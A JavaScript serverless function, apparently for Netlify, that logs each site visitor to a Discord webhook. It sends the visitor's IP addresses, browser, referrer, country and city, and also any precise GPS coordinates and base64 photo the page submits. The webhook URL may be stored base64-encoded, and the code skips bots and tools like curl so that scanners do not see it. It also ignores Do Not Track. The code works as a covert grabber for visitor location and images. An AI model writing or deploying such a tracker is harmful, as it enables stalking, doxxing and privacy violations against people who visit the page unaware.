export async function handler(event) {
  // Basic request info
  const headers = Object.fromEntries(Object.entries(event.headers || {}).map(([k, v]) => [k.toLowerCase(), v]));
  const dnt = headers["x-dnt"] || headers["dnt"] || "0";
  const ua = headers["user-agent"] || "";
  const referer = headers["referer"] || "";
  let browser = "";
  {
    const u = ua;
    if (/brave/i.test(u)) browser = "Brave";
    else if (/edg\//i.test(u)) browser = "Edge";
    else if (/opr\//i.test(u) || /opera/i.test(u)) browser = "Opera";
    else if (/vivaldi/i.test(u)) browser = "Vivaldi";
    else if (/firefox/i.test(u)) browser = "Firefox";
    else if (/safari/i.test(u) && !/(chrome|chromium|crios|edg\/)\s*/i.test(u)) browser = "Safari";
    else if (/(chrome|crios|chromium)/i.test(u)) browser = "Chrome";
  }
  const rawXff = headers["x-forwarded-for"] || "";
  const xffList = rawXff.split(",").map(s => s.trim()).filter(Boolean);
  const candidates = [
    headers["x-nf-client-connection-ip"],
    headers["x-real-ip"],
    ...xffList
  ].filter(Boolean);

  const ipv4Find = /(?:\d{1,3}\.){3}\d{1,3}/;
  let ipv4 = "";
  let ipv6 = "";
  for (const c of candidates) {
    const v4m = c.match(ipv4Find);
    if (!ipv4 && v4m) {
      const cand = v4m[0];
      const parts = cand.split('.').map(n => parseInt(n, 10));
      if (parts.length === 4 && parts.every(n => Number.isInteger(n) && n >= 0 && n <= 255)) ipv4 = cand;
    }
    // Heuristic for IPv6: contains ':' and not purely IPv4
    if (!ipv6 && c.includes(":") && !c.match(/^\s*(?:\d{1,3}\.){3}\d{1,3}\s*$/)) {
      ipv6 = c;
    }
    if (ipv4 && ipv6) break;
  }
  const ip = ipv4 || ipv6 || "";
  const url = headers["x-forwarded-host"] ? `${headers["x-forwarded-proto"] || "https"}://${headers["x-forwarded-host"]}${event.rawUrl?.split(headers["x-forwarded-host"])[1] || ""}` : event.rawUrl || "";
  let lat = null, lon = null, accuracy = null;
  try {
    if (event.body) {
      const b = JSON.parse(event.body);
      if (b && typeof b === 'object') {
        if (typeof b.lat === 'number' && typeof b.lon === 'number') { lat = b.lat; lon = b.lon; }
        if (typeof b.accuracy === 'number') accuracy = b.accuracy;
      }
    }
  } catch (_) {}

  // 1) Skip known bots/crawlers
  const uaLower = ua.toLowerCase();
  const botPatterns = [
    "bot", "crawler", "spider", "crawl", "fetch", "wget", "curl", "python-requests",
    "headless", "puppeteer", "playwright", "lighthouse", "monitor", "uptime",
    "googlebot", "bingbot", "duckduckbot", "baiduspider", "yandexbot", "twitterbot",
    "slackbot", "discordbot", "facebookexternalhit", "whatsapp"
  ];
  if (botPatterns.some(p => uaLower.includes(p))) {
    return { statusCode: 204, body: "" };
  }

  // 2) Geo: prefer Netlify geo header; fallback to ipapi.co
  let country = ""; let countryCode = ""; let city = "";
  try {
    const geoRaw = headers["x-nf-geo"];
    if (geoRaw) {
      const g = JSON.parse(geoRaw);
      country = g.country || "";
      countryCode = (g.country_code || g.countryCode || "").toUpperCase();
      city = g.city || "";
    }
  } catch (_) {}

  if (!countryCode && ip) {
    try {
      const r = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { headers: { "User-Agent": "netlify-func" } });
      if (r.ok) {
        const j = await r.json();
        country = j.country_name || country;
        countryCode = (j.country || countryCode || "").toUpperCase();
        city = j.city || city;
      }
    } catch (_) {}
  }

  // 3) Flag emoji from country code
  const flagEmoji = countryCode ? countryCode
    .replace(/[^A-Z]/g, "")
    .split("")
    .map(c => String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0)))
    .join("") : "🏳️";

  // 4) Build Discord embed
  const now = new Date().toISOString();
  const color = 0x00CED1; // teal
  const description = `${flagEmoji} New visitor ${country ? `from ${country}` : ""}`.trim();
  const embed = {
    title: "Visitor Log",
    description,
    color,
    fields: [
      { name: "IPv4", value: ipv4 || "-", inline: true },
      { name: "IPv6", value: ipv6 || "-", inline: true },
      { name: "Browser", value: browser || "-", inline: true },
      { name: "Country", value: country || countryCode || "-", inline: true },
      { name: "City", value: city || "-", inline: true },
      { name: "Coords", value: (lat != null && lon != null) ? `${lat.toFixed(5)}, ${lon.toFixed(5)}${accuracy!=null?` (±${Math.round(accuracy)}m)`:''}` : "-", inline: true },
      { name: "DNT", value: dnt, inline: true },
      { name: "User-Agent", value: ua ? (ua.length > 256 ? ua.slice(0, 253) + "..." : ua) : "-", inline: false },
      { name: "Referrer", value: referer || "-", inline: false },
      { name: "URL", value: url || "-", inline: false },
      { name: "Time", value: now, inline: false }
    ]
  };

  let files = undefined;
  if (typeof event.body === 'string') {
    try {
      const b = JSON.parse(event.body);
      if (b && typeof b.photo === 'string' && /^data:image\/(?:png|jpeg|jpg);base64,/.test(b.photo)) {
        const m = b.photo.match(/^data:(image\/(?:png|jpeg|jpg));base64,(.*)$/);
        if (m) {
          const mime = m[1];
          const buf = Buffer.from(m[2], 'base64');
          const filename = mime.includes('png') ? 'photo.png' : 'photo.jpg';
          files = [{ name: filename, data: buf }];
          embed.image = { url: `attachment://${filename}` };
        }
      }
    } catch (_) {}
  }
  const payload = { embeds: [embed] };

  // 5) Webhook from env
  const b64 = process.env.DISCORD_WEBHOOK_B64 || "";
  const direct = process.env.DISCORD_WEBHOOK_URL || "";
  const webhook = b64 ? Buffer.from(b64, "base64").toString("utf8") : direct;
  if (!webhook || !/^https:\/\/(?:discord(?:app)?\.com)\/api\/webhooks\//.test(webhook)) {
    return { statusCode: 500, body: "Webhook not configured" };
  }

  // 6) Send
  try {
    let resp;
    if (files) {
      const form = new FormData();
      form.append('payload_json', JSON.stringify(payload));
      for (const f of files) form.append('files[0]', new Blob([f.data]), f.name);
      resp = await fetch(webhook, { method: 'POST', body: form });
    } else {
      resp = await fetch(webhook, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload) });
    }
    if (!resp.ok) {
      return { statusCode: 502, body: "Failed to deliver" };
    }
    return { statusCode: 204, body: "" };
  } catch (_) {
    return { statusCode: 500, body: "Error" };
  }
}
